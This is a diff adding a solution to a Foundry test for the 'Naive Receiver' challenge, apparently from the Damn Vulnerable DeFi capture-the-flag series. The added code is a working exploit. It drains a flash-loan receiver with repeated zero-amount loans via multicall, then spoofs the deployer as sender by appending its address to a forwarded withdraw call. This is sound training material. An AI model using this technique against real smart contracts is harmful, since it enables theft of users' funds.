@@ -4,6 +4,8 @@ pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
 import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
+
+import {ECDSA} from "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";
 import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
 import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";
 
@@ -77,7 +79,58 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
+        // normal flow
+        // Send forward request to Basic Forwarder
+        // Basic Forwarder check and execute request to the target NaiveRecevierPool
+        // NaiveReceiverpool gives fl to flreceiver
+        // fl receiver execute and repays
         
+        bytes[] memory callDatas = new bytes[](11);
+        for(uint256 i=0; i<10; i++){
+            callDatas[i] = abi.encodeCall(NaiveReceiverPool.flashLoan, (receiver, address(weth), 0, "0x"));
+        }
+
+        callDatas[10] = abi.encodePacked(
+            abi.encodeCall(NaiveReceiverPool.withdraw, (1010e18, payable(recovery))),
+            address(deployer)
+        );
+
+        BasicForwarder.Request memory req = BasicForwarder.Request(
+            player, //from
+            address(pool),//target, 
+            0, //value, 
+            3000000,//gas, 
+            forwarder.nonces(player),//nonce, 
+            abi.encodeCall(
+                pool.multicall, 
+                callDatas
+                ),//data, 
+            block.timestamp+15//deadline
+            );
+
+        // Hash the request
+        bytes32 requestHash = keccak256(
+            abi.encodePacked(
+                "\x19\x01", 
+                forwarder.domainSeparator(), 
+                forwarder.getDataHash(req)
+            )
+        );
+
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash);
+
+        bytes memory signature = abi.encodePacked(r, s, v);
+        // Call the forwarder with the request and signature
+
+        /*(bool success, bytes memory result) = address(forwarder).call(
+            abi.encodeWithSignature("execute((address,address,uint256,uint256,uint256,bytes,uint256),bytes)", req, signature)
+        );*/
+
+        forwarder.execute(req, signature);
+        
+
+        console.log(weth.balanceOf(address(receiver)));
+        console.log("Pool deposits od deployer",pool.deposits(address(deployer)));
     }
 
     /**
@@ -96,4 +149,7 @@ contract NaiveReceiverChallenge is Test {
         // All funds sent to recovery account
         assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
     }
+
+    
 }
+
